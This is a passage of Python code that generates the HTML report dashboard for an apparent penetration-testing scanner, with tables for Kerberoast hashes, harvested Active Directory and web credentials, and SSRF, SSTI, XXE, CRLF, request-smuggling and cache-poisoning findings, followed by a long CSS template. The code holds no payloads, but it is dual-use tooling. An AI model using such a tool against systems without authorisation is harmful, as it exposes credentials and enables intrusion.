        + "</div><div class='panel'><h3>Kerberoasting</h3>"
        + table(["User/SPN", "Hash"], [[h.get("username", "-"), h.get("hash", "-")] for h in kerberoast_hashes], "No Kerberoast hashes.")
        + "</div><div class='panel'><h3>NXC credentials</h3>"
        + table(["User", "Password"], [[c.get("username", "-"), c.get("password", "-")] for c in ad_creds], "No NXC credentials.")
        + "</div>"
    )
    ad_raw = active_directory.get("raw_commands") or []
    if ad_raw:
        ad_content += "<div class='panel'><h3>AD tool outputs</h3>" + "".join(
            f"<details><summary>{esc(cmd.get('label', 'command'))}</summary><p class='muted'><code>{esc(cmd.get('command', '-'))}</code></p><pre>{esc(cmd.get('output', '') or '-')}</pre></details>"
            for cmd in ad_raw
        ) + "</div>"

    creds_content = "<div class='panel'>" + table(
        ["User", "Password"],
        [[c.get("username", "-"), c.get("password", "-")] for c in creds if isinstance(c, dict)],
        "No valid web credentials.",
    ) + "</div>"

    # Exposure surface: robots.txt, HTTP methods, injection tests
    inj_get = injection.get("tested_get_params") or []
    inj_forms = injection.get("tested_form_inputs") or []
    inj_form_rows = [[
        fi.get("form_action", "-") if isinstance(fi, dict) else "-",
        fi.get("input", fi) if isinstance(fi, dict) else fi,
        fi.get("method", "-") if isinstance(fi, dict) else "-",
    ] for fi in inj_forms]
    exposure_content = (
        "<div class='grid two'>"
        + "<div class='panel'><h3>robots.txt paths</h3>"
        + table(["Path"], [[p] for p in robots_paths], "No paths in robots.txt.")
        + "</div><div class='panel'><h3>Allowed HTTP Methods</h3>"
        + (compact_list(sorted(http_methods)) if http_methods else "<span class='muted'>No methods detected (OPTIONS).</span>")
        + "</div></div>"
        + "<div class='panel'><h3>Injection tests</h3>"
        + "<h4>Tested GET Parameters</h4>" + (compact_list(inj_get) if inj_get else "<span class='muted'>No GET parameters tested.</span>")
        + "<h4>Tested form inputs</h4>"
        + table(["Form action", "Input", "Method"], inj_form_rows, "No form inputs tested.")
        + "</div>"
    )

    adv_ssrf_rows = [[
        r.get("type", "ssrf"), r.get("param") or r.get("header") or "-",
        (r.get("payload") or r.get("value") or "")[:80], str(r.get("status", "-")),
    ] for r in adv_ssrf]
    adv_ssti_rows = [[r.get("url", "-")[:80], r.get("param", "-"), r.get("engine", "-")] for r in adv_ssti]
    adv_xxe_rows = [[r.get("url", "-")[:80], r.get("content_type", "-"), r.get("note", "confirmado")] for r in adv_xxe]
    adv_crlf_rows = [[r.get("vector", "-"), (r.get("param") or r.get("url") or "-")[:60], r.get("payload", "-")[:50]] for r in adv_crlf]
    adv_smuggling_rows = [[(r.get("tool") or r.get("type") or "-"), (r.get("note") or r.get("output_snippet") or "-")[:80]] for r in adv_smuggling]
    adv_cache_rows = [[r.get("header", "-"), r.get("value", "-")[:50], "Confirmed" if r.get("confirmed") else "Reflected"] for r in adv_cache]
    adv_summary_rows = [
        ["SSRF", str(len(adv_ssrf))],
        ["SSTI", str(len(adv_ssti))],
        ["XXE", str(len(adv_xxe))],
        ["CRLF", str(len(adv_crlf))],
        ["HTTP Smuggling", str(len(adv_smuggling))],
        ["Cache Poisoning", str(len(adv_cache))],
    ]
    adv_content = (
        "<div class='panel'><h3>Summary</h3>"
        + table(["Module", "Findings"], adv_summary_rows, "No advanced tests run.")
        + "</div>"
        + "<div class='panel'><h3>SSRF</h3>"
        + table(["Type", "Vector", "Payload/Value", "HTTP"], adv_ssrf_rows, "No SSRF findings.")
        + "</div>"
        + "<div class='panel'><h3>SSTI</h3>"
        + table(["URL", "Parameter", "Engine"], adv_ssti_rows, "No SSTI findings.")
        + "</div>"
        + "<div class='panel'><h3>XXE</h3>"
        + table(["URL", "Content-Type", "Status"], adv_xxe_rows, "No XXE findings.")
        + "</div>"
        + "<div class='panel'><h3>CRLF Injection</h3>"
        + table(["Vector", "URL/Param", "Payload"], adv_crlf_rows, "No CRLF findings.")
        + "</div>"
        + "<div class='panel'><h3>HTTP Request Smuggling</h3>"
        + table(["Tool/Type", "Detail"], adv_smuggling_rows, "No smuggling findings.")
        + "</div>"
        + "<div class='panel'><h3>Cache Poisoning</h3>"
        + table(["Header", "Injected value", "Status"], adv_cache_rows, "No cache poisoning findings.")
        + "</div>"
    )

    raw_content = (
        "<div class='panel'><h3>Statistics</h3><pre>"
        + esc(json.dumps(stats, indent=2, ensure_ascii=False))
        + "</pre></div><div class='panel'><h3>Complete JSON</h3><pre>"
        + esc(json.dumps(scan_data, indent=2, ensure_ascii=False))
        + "</pre></div>"
    )

    # Presence: only sections with collected information are shown.
    present = {
        "summary": True,
        "info": bool(technologies or users or emails or general.get("headers") or general.get("cookies") or general.get("server")),
        "nmap": bool(nmap_ports or nmap_nse),
        "findings": bool(findings),
        "nuclei": bool(nuclei_findings or nuclei_summary),
        "api": bool(api_endpoints),
        "vhosts": bool(vhosts),
        "directories": bool(directories),
        "exposure": bool(robots_paths or http_methods or inj_get or inj_forms),
        "advanced": bool(adv_sec),
        "wordpress": bool(wordpress),
        "spider": bool(spider.get("total_urls") or spider.get("sample_urls")),
        "source": bool(src_code.get("pages_analyzed") or src_findings),
        "ad": bool(active_directory),
        "credentials": bool(creds),
        "raw": bool(scan_data or stats),
    }
    all_sections = [
        ("summary", "Summary", overview_content, None),
        ("info", "General Information", info_content, len(technologies)),
        ("nmap", "Nmap and NSE", nmap_content, len(nmap_ports)),
        ("findings", "Findings", findings_content, len(findings)),
        ("nuclei", "Nuclei", nuclei_content, len(nuclei_findings)),
        ("api", "API", api_content, len(api_endpoints)),
        ("vhosts", "VHosts", vhost_content, len(vhosts)),
        ("directories", "Directories", dir_content, len(directories)),
        ("exposure", "Exposed Surface", exposure_content, len(robots_paths) + len(http_methods)),
        ("advanced", "Advanced Tests", adv_content, adv_total),
        ("wordpress", "WordPress", wp_content, len(wordpress.get("vulnerabilities") or [])),
        ("spider", "Spidering", spider_content, spider.get("total_urls", 0)),
        ("source", "Source Code", source_content, len(src_findings)),
        ("ad", "Active Directory", ad_content, len(ad_ldap.get("users") or [])),
        ("credentials", "Web Credentials", creds_content, len(creds)),
        ("raw", "Complete Data", raw_content, None),
    ]
    sections = [s for s in all_sections if present.get(s[0])]

    SEC_ICON = {
        "summary": "gauge", "info": "info", "nmap": "network", "findings": "warning-octagon",
        "nuclei": "bug-beetle", "api": "brackets-curly", "vhosts": "globe-hemisphere-west",
        "directories": "folders", "exposure": "eye", "advanced": "shield-warning", "wordpress": "wordpress-logo",
        "spider": "share-network", "source": "code", "ad": "tree-structure",
        "credentials": "key", "raw": "database",
    }
    # Phosphor doesn't include the WordPress logo: the official SVG is injected.
    WP_PATH = ("M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zM1.211 12c0-1.564.336-3.049.935-4.39"
               "l5.151 14.114C3.694 19.962 1.211 16.271 1.211 12zm10.789 10.789c-1.06 0-2.082-.155-3.048-.439l3.237-9.406 "
               "3.315 9.087c.022.053.048.101.078.149-1.12.393-2.325.609-3.582.609zm1.487-15.864c.65-.034 1.235-.103 1.235-.103"
               ".582-.069.514-.922-.069-.888 0 0-1.749.137-2.877.137-1.061 0-2.844-.137-2.844-.137-.583-.034-.651.853-.069.888"
               " 0 0 .551.069 1.132.103l1.681 4.604-2.361 7.078-3.926-11.682c.65-.034 1.235-.103 1.235-.103.582-.069.513-.922"
               "-.069-.888 0 0-1.748.137-2.876.137-.202 0-.441-.005-.695-.013C4.911 3.193 8.235 1.211 12 1.211c2.804 0 5.357 "
               "1.072 7.273 2.829-.046-.003-.092-.009-.139-.009-1.061 0-1.814.925-1.814 1.919 0 .893.515 1.648 1.061 2.541.41."
               "723.889 1.648.889 2.986 0 .926-.355 2.001-.822 3.498l-1.078 3.599-3.906-11.621zm5.16 14.583l3.297-9.532c.615-1."
               "538.82-2.769.82-3.862 0-.396-.026-.764-.073-1.106.838 1.531 1.316 3.288 1.316 5.156 0 3.965-2.15 7.426-5.348 "
               "9.293z")

    def sec_icon_html(sid, cls):
        if sid == "wordpress":
            return (f"<svg class='{cls}' viewBox='0 0 24 24' width='1em' height='1em' fill='currentColor' "
                    f"aria-hidden='true'><path d='{WP_PATH}'/></svg>")
        return f"<i class='ph ph-{SEC_ICON.get(sid, 'circle')} {cls}'></i>"

    def nav_link(idx, sid, title, count):
        cnt = "" if count in (None, 0) else f"<span class='ncount'>{esc(count)}</span>"
        return (
            f"<a href='#{sid}' data-target='{sid}' title='{esc(title)}'>"
            f"{sec_icon_html(sid, 'nicon')}"
            f"<span class='ntext'>{esc(title)}</span>{cnt}</a>"
        )

    nav = "<nav class='side-nav'>" + "".join(
        nav_link(i + 1, sid, title, count) for i, (sid, title, _c, count) in enumerate(sections)
    ) + "</nav>"

    def section_block(sid, title, count, content):
        cnt = "" if count in (None,) else f"<span class='count'>{esc(count)}</span>"
        return (
            f"<section id='{sid}' class='section'>"
            f"<div class='section-head'>{sec_icon_html(sid, 'shic')}<h2>{esc(title)}</h2>{cnt}"
            f"<a class='toplink' href='#top' title='Back to top'><i class='ph ph-arrow-up'></i></a></div>"
            f"{content}</section>"
        )

    section_html = "".join(section_block(sid, title, count, content) for sid, title, content, count in sections)

    # Barra de filtros: criticidad + tipo de seccion
    _sev_filter_items = [
        ("critical", "Critical", "c-crit"),
        ("high", "High", "c-high"),
        ("medium", "Medium", "c-med"),
        ("low", "Low", "c-low"),
        ("info", "Info", "c-info"),
    ]
    sev_chips = "".join(
        f"<button class='fchip fchip-{key}' data-filter-sev='{key}'>"
        f"{label} <b>{sev_counts.get(key, 0)}</b></button>"
        for key, label, _ in _sev_filter_items
        if sev_counts.get(key, 0) > 0
    )
    sec_chips = "".join(
        f"<button class='fchip' data-filter-sec='{sid}'>{sec_icon_html(sid, 'nicon')} {esc(title)}</button>"
        for sid, title, _, count in sections
        if sid not in ("summary", "raw")
    )
    filter_html = (
        "<div class='filter-bar' id='filterBar'>"
        "<div class='filter-group'>"
        "<span class='filter-lbl'><i class='ph ph-funnel'></i> Severity</span>"
        "<div class='filter-chips'>"
        "<button class='fchip active' data-filter-sev='all'>All</button>"
        f"{sev_chips}</div></div>"
        + (
            "<div class='filter-group'>"
            "<span class='filter-lbl'><i class='ph ph-squares-four'></i> Section</span>"
            "<div class='filter-chips'>"
            "<button class='fchip active' data-filter-sec='all'>All</button>"
            f"{sec_chips}</div></div>"
            if sec_chips else ""
        )
        + "</div>"
    ) if (sev_chips or sec_chips) else ""

    # Severity donut (conic-gradient) calculated server-side
    sev_palette = [
        ("critical", "var(--c-crit)"), ("high", "var(--c-high)"), ("medium", "var(--c-med)"),
        ("low", "var(--c-low)"), ("info", "var(--c-info)"),
    ]
    if sev_total:
        acc = 0.0
        stops = []
        for key_, col in sev_palette:
            c = sev_counts.get(key_, 0)
            if not c:
                continue
            start = acc / sev_total * 360
            acc += c
            end = acc / sev_total * 360
            stops.append(f"{col} {start:.2f}deg {end:.2f}deg")
        donut_gradient = ", ".join(stops)
    else:
        donut_gradient = "var(--green) 0deg 360deg"
    legend = "".join(
        f"<span class='leg'><i style='background:{col}'></i>{esc(key_.capitalize())}<b>{sev_counts.get(key_, 0)}</b></span>"
        for key_, col in sev_palette
    )
    risk_html = (
        "<div class='riskcard'>"
        f"<div class='donut' style='background:conic-gradient({donut_gradient})'>"
        f"<div class='donut-hole'><span>RISK</span><strong class='risk-{risk_tone}'>{esc(risk_label)}</strong>"
        f"<small>score {esc(risk_score)}</small></div></div>"
        f"<div class='legend'>{legend}</div></div>"
    )

    template = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>OWASP Scanner Dashboard - __TITLE_TARGET__</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://unpkg.com/@phosphor-icons/web@2.1.1/src/regular/style.css">
<link rel="stylesheet" href="https://unpkg.com/@phosphor-icons/web@2.1.1/src/fill/style.css">
<style>
:root{
  --bg:#f4f6fb; --surface:#ffffff; --surface-2:#eef1f6; --glass:rgba(255,255,255,.72); --text:#0f172a; --muted:#5b6675;
  --line:#dde3ec; --blue:#2563eb; --green:#0f9d6b; --amber:#b7791f; --orange:#d9772b; --red:#d33a34;
  --ink:#0b1220; --accent:#2563eb; --accent-2:#0ea5e9; --glow:rgba(37,99,235,.18); --shadow:rgba(15,23,42,.10);
  --c-crit:#d33a34; --c-high:#d9772b; --c-med:#caa11a; --c-low:#2563eb; --c-info:#8a93a3;
  --grid-line:rgba(37,99,235,.045);
  --font-head:"Space Grotesk","Segoe UI",sans-serif;
  --sidew:266px;
}
[data-theme="dark"]{
  --bg:#070a10; --surface:#0f141d; --surface-2:#161d29; --glass:rgba(15,20,29,.66); --text:#d6dde7; --muted:#7e8a99;
  --line:#1e2735; --blue:#5b9dff; --green:#33d68f; --amber:#e7b85a; --orange:#ff9d57; --red:#ff6b6b;
  --ink:#f4f7fb; --accent:#4d9bff; --accent-2:#38bdf8; --glow:rgba(77,155,255,.24); --shadow:rgba(0,0,0,.45);
  --c-crit:#ff6b6b; --c-high:#ff9d57; --c-med:#ffd24a; --c-low:#5b9dff; --c-info:#7e8a99;
  --grid-line:rgba(77,155,255,.05);
}
*{ box-sizing:border-box; }
html{ scroll-behavior:smooth; }
body{ margin:0; background:var(--bg); color:var(--text);
  font-family:Inter,"Segoe UI",Roboto,Arial,sans-serif; -webkit-font-smoothing:antialiased;
  background-image:
    radial-gradient(900px 480px at 100% -8%,var(--glow),transparent 60%),
    radial-gradient(700px 420px at -8% 8%,color-mix(in srgb,var(--accent-2) 14%,transparent),transparent 60%),
    linear-gradient(var(--grid-line) 1px,transparent 1px),
    linear-gradient(90deg,var(--grid-line) 1px,transparent 1px);
  background-size:auto,auto,34px 34px,34px 34px; background-attachment:fixed; }
h1,h2,h3,.brand-txt strong,.metric strong,.donut-hole strong{ font-family:var(--font-head); letter-spacing:-.01em; }
a{ color:inherit; text-decoration:none; }
code,pre{ font-family:"JetBrains Mono",Consolas,Menlo,Monaco,monospace; }
::selection{ background:var(--glow); }
.layout{ display:grid; grid-template-columns:var(--sidew) minmax(0,1fr); min-height:100vh; transition:grid-template-columns .22s ease; }
.layout.collapsed{ --sidew:74px; }
.side{ position:sticky; top:0; height:100vh; padding:16px 12px; border-right:1px solid var(--line);
  background:var(--glass); backdrop-filter:blur(14px); -webkit-backdrop-filter:blur(14px); overflow:auto; overflow-x:hidden; }
.brand{ display:flex; align-items:center; gap:11px; padding:4px 6px 14px; margin-bottom:10px; border-bottom:1px solid var(--line); }
.logo{ width:40px; height:40px; border-radius:12px; flex:0 0 auto; display:grid; place-items:center; position:relative;
  background:linear-gradient(135deg,var(--accent),var(--accent-2)); color:#ffffff; font-size:1.45rem;
  box-shadow:0 0 0 3px var(--glow),0 6px 18px var(--shadow); }
.brand-txt{ overflow:hidden; }
.brand-txt strong{ display:block; font-size:1rem; color:var(--ink); font-weight:700; white-space:nowrap; }
.brand-txt span{ display:block; color:var(--muted); font-size:.7rem; font-family:"JetBrains Mono",monospace; letter-spacing:.4px; text-transform:uppercase; white-space:nowrap; }
.collapse-btn{ position:fixed; top:20px; left:calc(var(--sidew) - 14px); z-index:55;
  width:28px; height:28px; border-radius:50%; border:1px solid var(--line); background:var(--surface); color:var(--muted);
  cursor:pointer; display:grid; place-items:center; box-shadow:0 2px 10px var(--shadow);
  transition:left .22s ease, color .15s, border-color .15s, background .15s; }
.collapse-btn:hover{ border-color:var(--accent); color:var(--accent); }
.collapse-btn #collapseIcon{ transition:transform .22s ease; }
.side-nav{ display:flex; flex-direction:column; gap:2px; }
.side-nav a{ display:flex; align-items:center; gap:10px; color:var(--muted); padding:9px 11px; border-radius:10px;
  font-size:.9rem; border-left:2px solid transparent; transition:.15s; white-space:nowrap; }
.side-nav a:hover{ background:var(--surface-2); color:var(--text); }
.side-nav a.active{ background:color-mix(in srgb,var(--accent) 12%,var(--surface)); color:var(--ink); border-left-color:var(--accent); }
.nicon{ font-size:1.15rem; color:var(--muted); flex:0 0 auto; width:20px; text-align:center; transition:color .15s; }
svg.nicon{ display:inline-block; vertical-align:-2px; } svg.shic{ display:inline-block; vertical-align:-3px; }
.side-nav a:hover .nicon,.side-nav a.active .nicon{ color:var(--accent); }
.ntext{ flex:1; overflow:hidden; text-overflow:ellipsis; }
.ncount{ font-family:"JetBrains Mono",monospace; font-size:.72rem; background:var(--surface); border:1px solid var(--line);
  border-radius:999px; padding:1px 7px; color:var(--muted); }
.collapsed .brand{ justify-content:center; gap:0; }
.collapsed .brand-txt,.collapsed .ntext,.collapsed .ncount,.collapsed #themeLabel{ display:none; }
.collapsed .side-nav a{ justify-content:center; padding:11px 0; }
.filter-bar{ display:flex; flex-wrap:wrap; gap:14px; margin-bottom:20px; padding:14px 16px;
  background:var(--surface); border:1px solid var(--line); border-radius:14px; }
.filter-group{ display:flex; align-items:flex-start; gap:8px; flex-wrap:wrap; }
.filter-lbl{ font-size:.74rem; font-weight:600; color:var(--muted); text-transform:uppercase; letter-spacing:.5px;
  padding-top:7px; white-space:nowrap; display:flex; align-items:center; gap:5px; }
.filter-chips{ display:flex; flex-wrap:wrap; gap:5px; }
.fchip{ border:1px solid var(--line); background:var(--surface-2); color:var(--muted); border-radius:9px;
  padding:5px 11px; font-size:.78rem; cursor:pointer; transition:.15s; display:inline-flex; align-items:center; gap:5px; }
.fchip:hover{ border-color:var(--accent); color:var(--ink); }
.fchip.active{ background:color-mix(in srgb,var(--accent) 14%,var(--surface)); border-color:var(--accent); color:var(--ink); font-weight:600; }
.fchip b{ font-family:"JetBrains Mono",monospace; font-size:.72rem; }
.fchip-critical{ --fc:var(--c-crit); } .fchip-high{ --fc:var(--c-high); }
.fchip-medium{ --fc:var(--c-med); } .fchip-low{ --fc:var(--c-low); } .fchip-info{ --fc:var(--c-info); }
.fchip-critical.active,.fchip-high.active,.fchip-medium.active,.fchip-low.active,.fchip-info.active{
  background:color-mix(in srgb,var(--fc) 14%,var(--surface)); border-color:var(--fc); color:var(--fc); }
.main{ padding:22px clamp(14px,3vw,36px) 40px; max-width:1580px; width:100%; }
.topbar{ position:sticky; top:0; z-index:40; display:flex; align-items:center; gap:11px; flex-wrap:wrap;
  margin:-22px calc(-1*clamp(14px,3vw,36px)) 18px; padding:14px clamp(14px,3vw,36px);
  background:var(--glass); backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px); border-bottom:1px solid var(--line); }
.menu-fab{ display:none; position:fixed; top:12px; left:12px; z-index:70; width:46px; height:46px; place-items:center;
  border:1px solid var(--line); background:var(--glass); backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px);
  color:var(--text); border-radius:13px; cursor:pointer; font-size:1.4rem; box-shadow:0 6px 18px var(--shadow); }
.search{ flex:1; min-width:200px; display:flex; align-items:center; gap:8px; background:var(--surface);
  border:1px solid var(--line); border-radius:11px; padding:9px 13px; transition:.15s; }
.search:focus-within{ border-color:var(--accent); box-shadow:0 0 0 3px var(--glow); }
.search input{ flex:1; border:0; background:transparent; color:var(--text); outline:none; font-size:.9rem; }
.search input::placeholder{ color:var(--muted); }
.btn{ border:1px solid var(--line); background:var(--surface); color:var(--text); border-radius:11px;
  padding:9px 13px; font-size:.86rem; cursor:pointer; transition:.15s; display:inline-flex; align-items:center; gap:7px; }
.btn:hover{ border-color:var(--accent); color:var(--ink); }
.hero{ display:grid; grid-template-columns:1fr auto; gap:20px; align-items:center; margin-bottom:18px;
  background:linear-gradient(135deg,var(--surface),var(--surface-2)); border:1px solid var(--line);
  border-radius:18px; padding:26px; position:relative; overflow:hidden; box-shadow:0 12px 40px var(--shadow); }
.hero::before{ content:""; position:absolute; inset:0; opacity:.5; pointer-events:none;
  background:radial-gradient(420px 220px at 88% -30%,var(--glow),transparent 65%),radial-gradient(360px 200px at 60% 130%,color-mix(in srgb,var(--accent-2) 18%,transparent),transparent 60%); }
.hero>*{ position:relative; z-index:1; }
.eyebrow{ display:inline-flex; align-items:center; gap:8px; font-family:"JetBrains Mono",monospace; font-size:.72rem; color:var(--accent); letter-spacing:1.6px; text-transform:uppercase; }
.eyebrow::before{ content:""; width:7px; height:7px; border-radius:50%; background:var(--accent); box-shadow:0 0 0 4px var(--glow); animation:pulse 2.4s ease-in-out infinite; }
@keyframes pulse{ 0%,100%{ opacity:1; } 50%{ opacity:.35; } }
.hero h1{ margin:10px 0 6px; font-size:2.55rem; line-height:1.08; color:var(--ink); font-weight:700; }
.hero p{ margin:0; color:var(--muted); font-family:"JetBrains Mono",monospace; font-size:.9rem; overflow-wrap:anywhere; }
.hero .tags{ margin-top:14px; display:flex; gap:8px; flex-wrap:wrap; }
.riskcard{ display:flex; align-items:center; gap:18px; }
.donut{ width:118px; height:118px; border-radius:50%; display:grid; place-items:center; flex:0 0 auto;
  box-shadow:0 0 0 1px var(--line),0 14px 36px var(--shadow); animation:spin .9s ease-out; }
@keyframes spin{ from{ transform:rotate(-120deg) scale(.85); opacity:0; } to{ transform:none; opacity:1; } }
.donut-hole{ width:82px; height:82px; border-radius:50%; background:var(--surface); display:grid; place-content:center; text-align:center;
  box-shadow:inset 0 0 12px var(--shadow); }
.donut-hole span{ font-size:.58rem; letter-spacing:1.5px; color:var(--muted); font-family:"JetBrains Mono",monospace; }
.donut-hole strong{ font-size:1rem; line-height:1.1; font-weight:700; }
.donut-hole small{ font-size:.6rem; color:var(--muted); font-family:"JetBrains Mono",monospace; }
.risk-bad{ color:var(--red); } .risk-warn{ color:var(--amber); } .risk-info{ color:var(--blue); } .risk-good{ color:var(--green); }
.legend{ display:flex; flex-direction:column; gap:6px; min-width:118px; }
.leg{ display:flex; align-items:center; gap:8px; font-size:.78rem; color:var(--muted); }
.leg i{ width:9px; height:9px; border-radius:3px; flex:0 0 auto; }
.leg b{ margin-left:auto; color:var(--text); font-family:"JetBrains Mono",monospace; }
.kpis{ display:grid; grid-template-columns:repeat(auto-fit,minmax(152px,1fr)); gap:12px; margin:0 0 20px; }
.metric{ background:var(--surface); border:1px solid var(--line); border-radius:14px; padding:14px 15px; position:relative;
  overflow:hidden; transition:transform .15s,box-shadow .15s,border-color .15s; }
.metric::before{ content:""; position:absolute; left:0; top:0; bottom:0; width:3px; background:var(--line); }
.metric:hover{ transform:translateY(-3px); border-color:var(--accent); box-shadow:0 12px 28px var(--shadow); }
.metric span{ display:block; color:var(--muted); font-size:.74rem; text-transform:uppercase; letter-spacing:.5px; }
.metric strong{ display:block; margin-top:9px; font-size:1.7rem; color:var(--ink); font-weight:700; }
.metric-good::before{ background:var(--green); } .metric-info::before{ background:var(--blue); }
.metric-warn::before{ background:var(--amber); } .metric-bad::before{ background:var(--red); }
.section{ margin:0 0 28px; scroll-margin-top:78px; }
.section-head{ display:flex; align-items:center; gap:11px; border-bottom:1px solid var(--line); margin-bottom:13px; padding-bottom:8px; }
.section-head .shic{ font-size:1.3rem; color:var(--accent); flex:0 0 auto; }
.section-head h2{ font-size:1.2rem; margin:0; color:var(--ink); font-weight:600; }
.metric span i{ margin-right:7px; color:var(--accent); font-size:.95rem; vertical-align:-1px; }
a.metric{ color:inherit; }
.btn i,.theme-btn i:not(#themeIcon),.toplink i{ font-size:1.05rem; vertical-align:-2px; }
.section-head .count{ font-family:"JetBrains Mono",monospace; font-size:.74rem; color:var(--accent);
  border:1px solid color-mix(in srgb,var(--accent) 35%,var(--line)); border-radius:999px; padding:1px 9px; }
.toplink{ margin-left:auto; color:var(--muted); font-size:1.05rem; padding:1px 8px; border-radius:8px; }
.toplink:hover{ color:var(--accent); background:var(--surface-2); }
.panel{ background:var(--surface); border:1px solid var(--line); border-radius:15px; padding:15px; margin-bottom:12px; box-shadow:0 3px 14px var(--shadow); }
.panel h3{ margin:0 0 12px; font-size:1rem; color:var(--ink); font-weight:600; display:flex; align-items:center; gap:9px; }
.panel h3::before{ content:""; width:8px; height:8px; border-radius:3px; background:linear-gradient(135deg,var(--accent),var(--accent-2)); }
.panel h4{ margin:14px 0 7px; font-size:.78rem; color:var(--muted); text-transform:uppercase; letter-spacing:.5px; }
.grid{ display:grid; gap:12px; } .grid.two{ grid-template-columns:repeat(2,minmax(0,1fr)); }
.table-wrap{ overflow:auto; border:1px solid var(--line); border-radius:12px; }
table{ width:100%; border-collapse:separate; border-spacing:0; min-width:600px; }
th,td{ text-align:left; padding:11px 13px; border-bottom:1px solid var(--line); vertical-align:top; font-size:.86rem; }
th{ position:sticky; top:0; background:var(--surface-2); color:var(--muted); font-weight:700; text-transform:uppercase;
  font-size:.7rem; letter-spacing:.6px; z-index:1; }
tbody tr{ transition:background .12s; } tbody tr:hover{ background:var(--surface-2); }
tr:last-child td{ border-bottom:none; }
td{ overflow-wrap:anywhere; } td code{ font-size:.82rem; color:var(--accent); }
.empty{ color:var(--muted); text-align:center; font-style:italic; }
.muted{ color:var(--muted); }
.badge{ display:inline-flex; align-items:center; min-height:22px; padding:2px 10px; border-radius:999px; font-size:.74rem;
  font-weight:700; border:1px solid var(--line); background:var(--surface-2); white-space:nowrap; letter-spacing:.3px; }
.badge-good{ color:var(--green); background:color-mix(in srgb,var(--green) 13%,var(--surface)); border-color:color-mix(in srgb,var(--green) 32%,var(--line)); }
.badge-info{ color:var(--blue); background:color-mix(in srgb,var(--blue) 13%,var(--surface)); border-color:color-mix(in srgb,var(--blue) 32%,var(--line)); }
.badge-warn{ color:var(--amber); background:color-mix(in srgb,var(--amber) 16%,var(--surface)); border-color:color-mix(in srgb,var(--amber) 32%,var(--line)); }
.badge-bad{ color:var(--red); background:color-mix(in srgb,var(--red) 13%,var(--surface)); border-color:color-mix(in srgb,var(--red) 34%,var(--line)); }
.chips{ display:flex; flex-wrap:wrap; gap:7px; }
.chip{ border:1px solid var(--line); background:var(--surface-2); border-radius:9px; padding:5px 11px; font-size:.8rem;
  font-family:"JetBrains Mono",monospace; transition:.15s; }
.chip:hover{ border-color:var(--accent); color:var(--accent); }
pre{ max-height:560px; overflow:auto; padding:15px; border-radius:12px; background:var(--surface-2); border:1px solid var(--line);
  white-space:pre-wrap; overflow-wrap:anywhere; font-size:.8rem; line-height:1.55; }
details{ border:1px solid var(--line); border-radius:12px; padding:11px 13px; margin-bottom:9px; background:var(--surface); }
summary{ cursor:pointer; color:var(--ink); font-weight:600; }
::-webkit-scrollbar{ width:10px; height:10px; }
::-webkit-scrollbar-track{ background:transparent; }
::-webkit-scrollbar-thumb{ background:var(--line); border-radius:999px; border:2px solid var(--bg); }
::-webkit-scrollbar-thumb:hover{ background:var(--muted); }
.hidden-row,.sev-hidden{ display:none !important; }
@media (max-width:980px){
  .layout,.layout.collapsed{ grid-template-columns:1fr; --sidew:266px; }
  .side{ position:fixed; z-index:60; width:280px; transform:translateX(-100%); transition:transform .22s; box-shadow:0 0 40px var(--shadow); }
  .side.open{ transform:translateX(0); }
  .menu-fab{ display:grid; } .collapse-btn{ display:none; }
  .collapsed .brand-txt,.collapsed .ntext,.collapsed .ncount,.collapsed #themeLabel{ display:block; }
  .main{ padding:16px; } .topbar{ margin:-16px -16px 16px; padding:12px 16px; }
  .grid.two{ grid-template-columns:1fr; }
  .hero{ grid-template-columns:1fr; } .hero h1{ font-size:1.95rem; }
  .riskcard{ justify-content:flex-start; }
}
@media (prefers-reduced-motion:reduce){ *{ animation:none !important; transition:none !important; } }
@media print{
  @page{ margin:12mm 10mm; }
  /* Force a light PDF palette for maximum readability and lower ink use */
  :root,[data-theme="dark"]{
    --bg:#ffffff; --surface:#ffffff; --surface-2:#f3f5f9; --glass:#ffffff; --text:#16202e; --muted:#54606e;
    --line:#cfd6e2; --ink:#0b1220; --accent:#0a8f6c; --accent-2:#2358d8; --glow:transparent; --shadow:transparent;
    --c-crit:#c2271f; --c-high:#c25e15; --c-med:#9a7d0a; --c-low:#2358d8; --c-info:#6b7480;
  }
  *{ -webkit-print-color-adjust:exact !important; print-color-adjust:exact !important; box-shadow:none !important; }
  .side,.topbar,.toplink,.collapse-btn,.menu-fab{ display:none !important; }
  html,body{ background:#fff !important; background-image:none !important; color:var(--text) !important; }
  .layout,.layout.collapsed{ display:block !important; grid-template-columns:1fr !important; }
  .main{ padding:0 14mm !important; max-width:none !important; }
  .hero{ margin-top:4px; }
  /* Avoid awkward page breaks */
  .panel,.metric,details,.table-wrap,.riskcard,.donut,.kpis,img{ break-inside:avoid; page-break-inside:avoid; }
  tr{ break-inside:avoid; page-break-inside:avoid; }
  thead{ display:table-header-group; } th{ position:static !important; }
  .section{ break-inside:auto; margin-bottom:18px; }
  .section-head,h1,h2,h3,h4{ break-after:avoid; page-break-after:avoid; }
  /* Show full content (no scroll clipping) */
  pre{ max-height:none !important; overflow:visible !important; }
  .table-wrap{ overflow:visible !important; } table{ min-width:0 !important; }
  /* Extra breathing room so nothing sits flush against the edges */
  section.section:first-of-type{ padding-top:2px; }
}
</style>
</head>
<body>
<span id="top"></span>
<button class="menu-fab" id="menuBtn" type="button" aria-label="Open menu"><i class="ph ph-list"></i></button>
<div class="layout" id="layout">
  <aside class="side" id="sidebar">
    <div class="brand">
      <div class="logo"><i class="ph-fill ph-magnifying-glass"></i></div>
      <div class="brand-txt">
        <strong>OWASP&nbsp;Scanner</strong>
        <span>Security Report</span>
      </div>
    </div>
    __NAV__
  </aside>
  <button class="collapse-btn" id="collapseBtn" type="button" title="Collapse / expand menu" aria-label="Collapse or expand menu">
    <i id="collapseIcon" class="ph ph-caret-left"></i>
  </button>
  <main class="main">
    <div class="topbar">
